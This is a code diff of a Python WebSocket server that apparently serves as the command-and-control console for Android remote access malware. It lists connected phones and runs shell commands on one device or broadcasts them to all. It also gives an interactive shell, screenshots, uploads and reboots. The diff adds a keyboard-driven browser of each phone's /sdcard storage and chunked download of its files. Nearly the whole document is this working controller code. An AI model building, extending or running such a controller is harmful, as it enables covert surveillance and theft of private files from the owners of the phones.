@@ -9,9 +9,11 @@ import time
 import datetime
 import threading
 import signal
+import readline
+import termios
+import tty
 from typing import Dict, Optional
 
-# Try to import websocket-server
 try:
     from websocket_server import WebsocketServer
 except ImportError:
@@ -23,7 +25,6 @@ try:
     from colorama import init, Fore, Back, Style
     init(autoreset=True)
 except ImportError:
-    # Fallback if colorama not installed
     class Fore:
         RED = '\033[91m'
         GREEN = '\033[92m'
@@ -46,8 +47,16 @@ SERVER_PORT = 8083
 connected_devices = {}
 device_info = {}
 command_history = {}
-response_buffer = {}
-response_timeout = 30
+download_state = {}  # For tracking download progress
+
+# File browser state
+file_browser_state = {
+    'device_id': None,
+    'current_path': '/sdcard',
+    'files': [],
+    'selected_index': 0,
+    'waiting_for_response': False
+}
 
 # Colors
 C = {
@@ -63,7 +72,6 @@ C = {
 }
 
 def print_banner():
-    """Print fancy banner"""
     banner = f"""
 {C['HEADER']}╔══════════════════════════════════════════════════════════════╗
 {C['HEADER']}║                                                              ║
@@ -82,7 +90,6 @@ def print_banner():
     print(banner)
 
 def print_menu():
-    """Print main menu"""
     menu = f"""
 {C['GREEN']}╔══════════════════════════════════════════════════════════════╗
 {C['GREEN']}║                    {C['WHITE']}COMMAND MENU{C['GREEN']}                         ║
@@ -99,18 +106,35 @@ def print_menu():
 {C['GREEN']}║  {C['YELLOW']}10.{C['RESET']}View command history for device                {C['GREEN']}║
 {C['GREEN']}║  {C['YELLOW']}11.{C['RESET']}Broadcast command to ALL devices                {C['GREEN']}║
 {C['GREEN']}║  {C['YELLOW']}12.{C['RESET']}Interactive shell mode                          {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}13.{C['RESET']}File Browser with keyboard navigation          {C['GREEN']}║
 {C['GREEN']}║  {C['YELLOW']}0.{C['RESET']} Exit                                            {C['GREEN']}║
 {C['GREEN']}╚══════════════════════════════════════════════════════════════╝
 {C['RESET']}
 """
     print(menu)
 
+def print_file_browser_help():
+    help_text = f"""
+{C['GREEN']}╔══════════════════════════════════════════════════════════════╗
+{C['GREEN']}║              {C['WHITE']}FILE BROWSER CONTROLS{C['GREEN']}                    ║
+{C['GREEN']}╠══════════════════════════════════════════════════════════════╣
+{C['GREEN']}║  {C['YELLOW']}↑ / ↓{C['RESET']}       - Navigate up/down                      {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}Enter / →{C['RESET']}   - Open directory / select file          {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}← / Backspace{C['RESET']} - Go to parent directory              {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}d{C['RESET']}            - Download selected file                {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}s{C['RESET']}            - Download selected file (alternative)  {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}q / ESC{C['RESET']}      - Exit file browser                     {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}h / ?{C['RESET']}        - Show this help                        {C['GREEN']}║
+{C['GREEN']}║  {C['YELLOW']}r{C['RESET']}            - Refresh current directory              {C['GREEN']}║
+{C['GREEN']}╚══════════════════════════════════════════════════════════════╝
+{C['RESET']}
+"""
+    print(help_text)
+
 def get_devices_list():
-    """Get list of connected device IDs"""
     return list(connected_devices.keys())
 
 def select_device(prompt="Select device ID"):
-    """Interactive device selection"""
     devices = get_devices_list()
     
     if not devices:
@@ -137,16 +161,13 @@ def select_device(prompt="Select device ID"):
             print(f"{C['RED']}Please enter a valid number!{C['RESET']}")
 
 def send_command_to_device(client, device_id, command):
-    """Send command to a specific device"""
     if device_id not in connected_devices:
         print(f"{C['RED']}❌ Device {device_id} not connected!{C['RESET']}")
         return False
     
     try:
-        # Send command to client
         client.send_message(connected_devices[device_id], json.dumps(command))
         
-        # Log command history
         if device_id not in command_history:
             command_history[device_id] = []
         command_history[device_id].append({
@@ -155,14 +176,12 @@ def send_command_to_device(client, device_id, command):
             'status': 'sent'
         })
         
-        print(f"{C['GREEN']}✅ Command sent to {device_id[:16]}...{C['RESET']}")
         return True
     except Exception as e:
         print(f"{C['RED']}❌ Failed to send command: {e}{C['RESET']}")
         return False
 
 def handle_device_info(device_id, data):
-    """Handle device info message"""
     device_info[device_id] = data
     model = data.get('model', 'Unknown')
     android_version = data.get('android_version', 'Unknown')
@@ -174,7 +193,8 @@ def handle_device_info(device_id, data):
     print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}")
 
 def handle_command_response(device_id, data):
-    """Handle command response from device"""
+    global download_state
+    
     cmd_type = data.get('type', 'unknown')
     
     if cmd_type == 'exec_result':
@@ -197,7 +217,92 @@ def handle_command_response(device_id, data):
         print(f"{C['YELLOW']}Exit Code: {exit_code}{C['RESET']}")
         print(f"{C['MAGENTA']}═" * 50 + f"{C['RESET']}\n")
     
+    # ==================== DOWNLOAD PROGRESS ====================
+    
+    elif cmd_type == 'download_start':
+        file_path = data.get('path', 'unknown')
+        file_size = data.get('size', 0)
+        total_chunks = data.get('total_chunks', 0)
+        
+        download_state[device_id] = {
+            'path': file_path,
+            'size': file_size,
+            'total_chunks': total_chunks,
+            'received_chunks': 0,
+            'chunks': [],
+            'start_time': time.time()
+        }
+        
+        print(f"\n{C['GREEN']}📥 Download started: {os.path.basename(file_path)}{C['RESET']}")
+        print(f"  {C['WHITE']}Size:{C['RESET']} {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)")
+        print(f"  {C['WHITE']}Total Chunks:{C['RESET']} {total_chunks}")
+        print(f"{C['YELLOW']}─" * 50 + f"{C['RESET']}")
+        print(f"{C['YELLOW']}Progress: 0%{C['RESET']}", end='', flush=True)
+    
+    elif cmd_type == 'download_chunk':
+        chunk_index = data.get('chunk_index', 0)
+        chunk_data = data.get('data', '')
+        
+        if device_id in download_state:
+            state = download_state[device_id]
+            state['chunks'].append(chunk_data)
+            state['received_chunks'] += 1
+            
+            total = state['total_chunks']
+            received = state['received_chunks']
+            progress = int((received * 100) / total)
+            
+            # Update progress every 5%
+            if progress % 5 == 0 or received == total:
+                elapsed = time.time() - state['start_time']
+                speed = (state['size'] * progress / 100) / elapsed if elapsed > 0 else 0
+                speed_mb = speed / (1024 * 1024)
+                
+                print(f"\r{C['YELLOW']}Progress: {progress}% ({received}/{total} chunks) - {speed_mb:.2f} MB/s{C['RESET']}", end='', flush=True)
+    
+    elif cmd_type == 'download_end':
+        file_path = data.get('path', 'unknown')
+        total_chunks = data.get('total_chunks', 0)
+        file_size = data.get('size', 0)
+        
+        if device_id in download_state:
+            state = download_state[device_id]
+            
+            # Combine all chunks
+            print(f"\r{C['YELLOW']}Progress: 100% ({total_chunks}/{total_chunks} chunks){C['RESET']}")
+            print(f"{C['YELLOW']}─" * 50 + f"{C['RESET']}")
+            print(f"{C['GREEN']}📦 Assembling file...{C['RESET']}")
+            
+            all_data = b''
+            for chunk_b64 in state['chunks']:
+                all_data += base64.b64decode(chunk_b64)
+            
+            # Save file
+            filename = os.path.basename(file_path)
+            if not filename:
+                filename = f"downloaded_{int(time.time())}.bin"
+            
+            save_path = os.path.join('downloads', filename)
+            os.makedirs('downloads', exist_ok=True)
+            
+            with open(save_path, 'wb') as f:
+                f.write(all_data)
+            
+            elapsed = time.time() - state['start_time']
+            speed = file_size / elapsed if elapsed > 0 else 0
+            
+            print(f"{C['GREEN']}✅ Download complete!{C['RESET']}")
+            print(f"  {C['WHITE']}File:{C['RESET']} {save_path}")
+            print(f"  {C['WHITE']}Size:{C['RESET']} {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)")
+            print(f"  {C['WHITE']}Time:{C['RESET']} {elapsed:.2f} seconds")
+            print(f"  {C['WHITE']}Speed:{C['RESET']} {speed / (1024*1024):.2f} MB/s")
+            
+            # Clean up
+            del download_state[device_id]
+            print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
+    
     elif cmd_type == 'file_download':
+        # Old format - keep for compatibility
         file_path = data.get('path', 'unknown')
         file_size = data.get('size', 0)
         file_content = data.get('base64', '')
@@ -230,24 +335,31 @@ def handle_command_response(device_id, data):
         directory = data.get('directory', '/sdcard')
         files = data.get('files', [])
         
-        print(f"\n{C['GREEN']}📂 File list from {device_id[:16]}...{C['RESET']}")
-        print(f"  {C['WHITE']}Directory:{C['RESET']} {directory}")
-        print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
+        file_browser_state['files'] = files
+        file_browser_state['current_path'] = directory
+        file_browser_state['waiting_for_response'] = False
         
-        if files:
-            for file_info in files:
-                name = file_info.get('name', '')
-                size = file_info.get('size', 0)
-                is_dir = file_info.get('is_directory', False)
-                
-                icon = "📁" if is_dir else "📄"
-                size_str = f"{size:,} bytes" if size > 0 else "-"
-                
-                print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
+        if file_browser_state['device_id']:
+            display_file_browser()
         else:
-            print(f"  {C['YELLOW']}No files found or empty directory{C['RESET']}")
-        
-        print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
+            print(f"\n{C['GREEN']}📂 File list from {device_id[:16]}...{C['RESET']}")
+            print(f"  {C['WHITE']}Directory:{C['RESET']} {directory}")
+            print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
+            
+            if files:
+                for file_info in files:
+                    name = file_info.get('name', '')
+                    size = file_info.get('size', 0)
+                    is_dir = file_info.get('is_directory', False)
+                    
+                    icon = "📁" if is_dir else "📄"
+                    size_str = f"{size:,} bytes" if size > 0 else "-"
+                    
+                    print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
+            else:
+                print(f"  {C['YELLOW']}No files found or empty directory{C['RESET']}")
+            
+            print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
     
     elif cmd_type == 'response':
         status = data.get('status', 'unknown')
@@ -266,23 +378,209 @@ def handle_command_response(device_id, data):
     else:
         print(f"{C['YELLOW']}📩 Received: {json.dumps(data, indent=2)}{C['RESET']}")
 
+def display_file_browser():
+    files = file_browser_state['files']
+    current_path = file_browser_state['current_path']
+    selected = file_browser_state['selected_index']
+    device_id = file_browser_state['device_id']
+    
+    os.system('clear' if os.name == 'posix' else 'cls')
+    
+    print(f"{C['HEADER']}═" * 80 + f"{C['RESET']}")
+    print(f"{C['GREEN']}📱 File Browser - {device_id[:16]}...{C['RESET']}")
+    print(f"{C['YELLOW']}📂 {current_path}{C['RESET']}")
+    print(f"{C['HEADER']}─" * 80 + f"{C['RESET']}")
+    
+    if not files:
+        print(f"{C['RED']}  (No files or empty directory){C['RESET']}")
+    else:
+        for i, file_info in enumerate(files):
+            name = file_info.get('name', '')
+            size = file_info.get('size', 0)
+            is_dir = file_info.get('is_directory', False)
+            
+            icon = "📁" if is_dir else "📄"
+            size_str = f"{size:,} bytes" if size > 0 else "-"
+            
+            if i == selected:
+                print(f"{C['GREEN']}▶ {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']}) {C['GREEN']}◀{C['RESET']}")
+            else:
+                print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
+    
+    print(f"{C['HEADER']}─" * 80 + f"{C['RESET']}")
+    print(f"{C['YELLOW']}↑/↓ Navigate | Enter/→ Open | ←/Backspace Parent | d Download | q Exit{C['RESET']}")
+
+def get_key():
+    fd = sys.stdin.fileno()
+    old_settings = termios.tcgetattr(fd)
+    try:
+        tty.setraw(sys.stdin.fileno())
+        ch = sys.stdin.read(1)
+    finally:
+        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+    return ch
+
+def cmd_file_browser(server):
+    device_id = select_device()
+    if not device_id:
+        return
+    
+    file_browser_state['device_id'] = device_id
+    file_browser_state['current_path'] = '/sdcard'
+    file_browser_state['selected_index'] = 0
+    file_browser_state['files'] = []
+    file_browser_state['waiting_for_response'] = False
+    
+    print_file_browser_help()
+    input(f"\n{C['YELLOW']}Press Enter to start file browser...{C['RESET']}")
+    
+    cmd_data = {"cmd": "list_files", "directory": "/sdcard"}
+    send_command_to_device(server, device_id, cmd_data)
+    file_browser_state['waiting_for_response'] = True
+    time.sleep(2)
+    
+    while True:
+        try:
+            if not file_browser_state['waiting_for_response']:
+                display_file_browser()
+            
+            key = get_key()
+            
+            if key == '\x1b':
+                next_key = sys.stdin.read(1)
+                if next_key == '[':
+                    arrow = sys.stdin.read(1)
+                    if arrow == 'A':
+                        if file_browser_state['selected_index'] > 0:
+                            file_browser_state['selected_index'] -= 1
+                        continue
+                    elif arrow == 'B':
+                        files = file_browser_state['files']
+                        if file_browser_state['selected_index'] < len(files) - 1:
+                            file_browser_state['selected_index'] += 1
+                        continue
+                    elif arrow == 'C':
+                        pass
+                    elif arrow == 'D':
+                        pass
+            
+            if key == 'q' or key == 'Q' or key == '\x1b':
+                print(f"\n{C['YELLOW']}🔚 Exiting file browser{C['RESET']}")
+                file_browser_state['device_id'] = None
+                break
+            
+            elif key == 'h' or key == '?':
+                print_file_browser_help()
+                input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
+                continue
+            
+            elif key == 'r' or key == 'R':
+                cmd_data = {"cmd": "list_files", "directory": file_browser_state['current_path']}
+                send_command_to_device(server, device_id, cmd_data)
+                file_browser_state['waiting_for_response'] = True
+                time.sleep(1)
+                continue
+            
+            elif key == '\x7f' or key == '\x08' or key == '\x1b[D':
+                current = file_browser_state['current_path']
+                if current == '/sdcard':
+                    parent = '/storage/emulated/0'
+                else:
+                    parent = os.path.dirname(current)
+                    if parent == current:
+                        parent = '/sdcard'
+                    elif parent == '':
+                        parent = '/sdcard'
+                
+                file_browser_state['current_path'] = parent
+                file_browser_state['selected_index'] = 0
+                cmd_data = {"cmd": "list_files", "directory": parent}
+                send_command_to_device(server, device_id, cmd_data)
+                file_browser_state['waiting_for_response'] = True
+                time.sleep(1)
+                continue
+            
+            elif key == '\r' or key == '\n' or key == '\x1b[C':
+                files = file_browser_state['files']
+                idx = file_browser_state['selected_index']
+                
+                if idx < len(files):
+                    file_info = files[idx]
+                    name = file_info.get('name', '')
+                    is_dir = file_info.get('is_directory', False)
+                    
+                    if is_dir:
+                        new_path = file_browser_state['current_path']
+                        if not new_path.endswith('/'):
+                            new_path += '/'
+                        new_path += name
+                        
+                        file_browser_state['current_path'] = new_path
+                        file_browser_state['selected_index'] = 0
+                        cmd_data = {"cmd": "list_files", "directory": new_path}
+                        send_command_to_device(server, device_id, cmd_data)
+                        file_browser_state['waiting_for_response'] = True
+                        time.sleep(1)
+                    else:
+                        file_path = file_browser_state['current_path']
+                        if not file_path.endswith('/'):
+                            file_path += '/'
+                        file_path += name
+                        
+                        print(f"\n{C['GREEN']}📥 Downloading: {name}{C['RESET']}")
+                        cmd_data = {"cmd": "download", "path": file_path}
+                        send_command_to_device(server, device_id, cmd_data)
+                        time.sleep(1)
+                continue
+            
+            elif key == 'd' or key == 'D' or key == 's' or key == 'S':
+                files = file_browser_state['files']
+                idx = file_browser_state['selected_index']
+                
+                if idx < len(files):
+                    file_info = files[idx]
+                    name = file_info.get('name', '')
+                    is_dir = file_info.get('is_directory', False)
+                    
+                    if is_dir:
+                        print(f"{C['YELLOW']}⚠️ Cannot download directory: {name}{C['RESET']}")
+                    else:
+                        file_path = file_browser_state['current_path']
+                        if not file_path.endswith('/'):
+                            file_path += '/'
+                        file_path += name
+                        
+                        print(f"\n{C['GREEN']}📥 Downloading: {name}{C['RESET']}")
+                        cmd_data = {"cmd": "download", "path": file_path}
+                        send_command_to_device(server, device_id, cmd_data)
+                        time.sleep(1)
+                else:
+                    print(f"{C['RED']}❌ No file selected!{C['RESET']}")
+                continue
+            
+            else:
+                continue
+            
+        except KeyboardInterrupt:
+            print(f"\n{C['YELLOW']}🔚 Exiting file browser{C['RESET']}")
+            file_browser_state['device_id'] = None
+            break
+        except Exception as e:
+            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
+            time.sleep(1)
+
 # ================= WEBSOCKET SERVER CALLBACKS =================
 
 def new_client(client, server):
-    """Called when a new client connects"""
-    # Get device ID from headers
     device_id = client.get('headers', {}).get('x-device-id', 'unknown')
     
     if device_id == 'unknown':
         device_id = f"device_{client['id']}"
     
-    # Store connection
     connected_devices[device_id] = client
     print(f"{C['GREEN']}✅ Device connected: {device_id[:16]}...{C['RESET']}")
 
 def client_left(client, server):
-    """Called when a client disconnects"""
-    # Find and remove device
     for device_id, ws_client in list(connected_devices.items()):
         if ws_client['id'] == client['id']:
             connected_devices.pop(device_id, None)
@@ -290,8 +588,6 @@ def client_left(client, server):
             break
 
 def message_received(client, server, message):
-    """Called when a message is received from a client"""
-    # Find device ID
     device_id = None
     for did, ws_client in connected_devices.items():
         if ws_client['id'] == client['id']:
@@ -310,7 +606,6 @@ def message_received(client, server, message):
 # ================= COMMAND FUNCTIONS =================
 
 def cmd_list_devices():
-    """Command: List connected devices"""
     devices = get_devices_list()
     
     if not devices:
@@ -335,7 +630,6 @@ def cmd_list_devices():
     print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}\n")
 
 def cmd_execute_command(server):
-    """Command: Execute shell command on device"""
     device_id = select_device()
     if not device_id:
         return
@@ -345,15 +639,10 @@ def cmd_execute_command(server):
         print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
         return
     
-    cmd_data = {
-        "cmd": "exec",
-        "command": command
-    }
-    
+    cmd_data = {"cmd": "exec", "command": command}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_download_file(server):
-    """Command: Download file from device"""
     device_id = select_device()
     if not device_id:
         return
@@ -363,15 +652,10 @@ def cmd_download_file(server):
         print(f"{C['RED']}❌ File path cannot be empty!{C['RESET']}")
         return
     
-    cmd_data = {
-        "cmd": "download",
-        "path": file_path
-    }
-    
+    cmd_data = {"cmd": "download", "path": file_path}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_upload_file(server):
-    """Command: Upload file to device"""
     device_id = select_device()
     if not device_id:
         return
@@ -389,18 +673,12 @@ def cmd_upload_file(server):
         with open(local_path, 'rb') as f:
             file_data = base64.b64encode(f.read()).decode('utf-8')
         
-        cmd_data = {
-            "cmd": "upload",
-            "path": remote_path,
-            "data": file_data
-        }
-        
+        cmd_data = {"cmd": "upload", "path": remote_path, "data": file_data}
         send_command_to_device(server, device_id, cmd_data)
     except Exception as e:
         print(f"{C['RED']}❌ Failed to read file: {e}{C['RESET']}")
 
 def cmd_list_files(server):
-    """Command: List files on device"""
     device_id = select_device()
     if not device_id:
         return
@@ -409,51 +687,34 @@ def cmd_list_files(server):
     if not directory:
         directory = "/sdcard"
     
-    cmd_data = {
-        "cmd": "list_files",
-        "directory": directory
-    }
-    
+    cmd_data = {"cmd": "list_files", "directory": directory}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_take_screenshot(server):
-    """Command: Take screenshot on device"""
     device_id = select_device()
     if not device_id:
         return
     
-    cmd_data = {
-        "cmd": "screenshot"
-    }
-    
+    cmd_data = {"cmd": "screenshot"}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_get_info(server):
-    """Command: Get device info"""
     device_id = select_device()
     if not device_id:
         return
     
-    cmd_data = {
-        "cmd": "get_info"
-    }
-    
+    cmd_data = {"cmd": "get_info"}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_ping(server):
-    """Command: Ping device"""
     device_id = select_device()
     if not device_id:
         return
     
-    cmd_data = {
-        "cmd": "ping"
-    }
-    
+    cmd_data = {"cmd": "ping"}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_reboot(server):
-    """Command: Reboot device"""
     device_id = select_device()
     if not device_id:
         return
@@ -463,14 +724,10 @@ def cmd_reboot(server):
         print(f"{C['YELLOW']}❌ Reboot cancelled{C['RESET']}")
         return
     
-    cmd_data = {
-        "cmd": "reboot"
-    }
-    
+    cmd_data = {"cmd": "reboot"}
     send_command_to_device(server, device_id, cmd_data)
 
 def cmd_view_history():
-    """Command: View command history for device"""
     device_id = select_device()
     if not device_id:
         return
@@ -497,7 +754,6 @@ def cmd_view_history():
     print(f"\n{C['MAGENTA']}═" * 60 + f"{C['RESET']}\n")
 
 def cmd_broadcast(server):
-    """Command: Broadcast command to all devices"""
     devices = get_devices_list()
     if not devices:
         print(f"\n{C['RED']}❌ No devices connected!{C['RESET']}\n")
@@ -508,10 +764,7 @@ def cmd_broadcast(server):
         print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
         return
     
-    cmd_data = {
-        "cmd": "exec",
-        "command": command
-    }
+    cmd_data = {"cmd": "exec", "command": command}
     
     print(f"\n{C['GREEN']}📢 Broadcasting to {len(devices)} devices...{C['RESET']}")
     for device_id in devices:
@@ -520,7 +773,6 @@ def cmd_broadcast(server):
     print(f"{C['GREEN']}✅ Broadcast complete!{C['RESET']}\n")
 
 def cmd_interactive_shell(server):
-    """Command: Interactive shell mode"""
     device_id = select_device()
     if not device_id:
         return
@@ -582,32 +834,27 @@ def cmd_interactive_shell(server):
             print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
 
 def signal_handler(sig, frame):
-    """Handle Ctrl+C"""
     print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
     sys.exit(0)
 
 # ================= MAIN =================
 
 def main():
-    """Main function"""
     signal.signal(signal.SIGINT, signal_handler)
     
     os.system('clear' if os.name == 'posix' else 'cls')
     print_banner()
     
-    # Create downloads directory
     os.makedirs('downloads', exist_ok=True)
     
     print(f"{C['GREEN']}🚀 Starting WebSocket server on {SERVER_HOST}:{SERVER_PORT}{C['RESET']}")
     print(f"{C['YELLOW']}📡 Waiting for Android devices to connect...{C['RESET']}\n")
     
-    # Create and start server
     server = WebsocketServer(host=SERVER_HOST, port=SERVER_PORT)
     server.set_fn_new_client(new_client)
     server.set_fn_client_left(client_left)
     server.set_fn_message_received(message_received)
     
-    # Run server in a separate thread
     import threading
     server_thread = threading.Thread(target=server.run_forever, daemon=True)
     server_thread.start()
@@ -615,7 +862,6 @@ def main():
     print(f"{C['GREEN']}✅ Server started successfully!{C['RESET']}")
     print(f"{C['WHITE']}Press Ctrl+C to stop the server{C['RESET']}\n")
     
-    # Main menu loop
     while True:
         try:
             print_menu()
@@ -661,12 +907,16 @@ def main():
             elif choice == '12':
                 cmd_interactive_shell(server)
             
+            elif choice == '13':
+                cmd_file_browser(server)
+            
             else:
                 print(f"{C['RED']}❌ Invalid choice! Please try again.{C['RESET']}")
             
-            input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
-            os.system('clear' if os.name == 'posix' else 'cls')
-            print_banner()
+            if choice != '13':
+                input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
+                os.system('clear' if os.name == 'posix' else 'cls')
+                print_banner()
             
         except KeyboardInterrupt:
             print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
@@ -674,7 +924,6 @@ def main():
         except Exception as e:
             print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
     
-    # Cleanup
     server.shutdown()
     print(f"{C['GREEN']}✅ Server stopped successfully!{C['RESET']}")
 
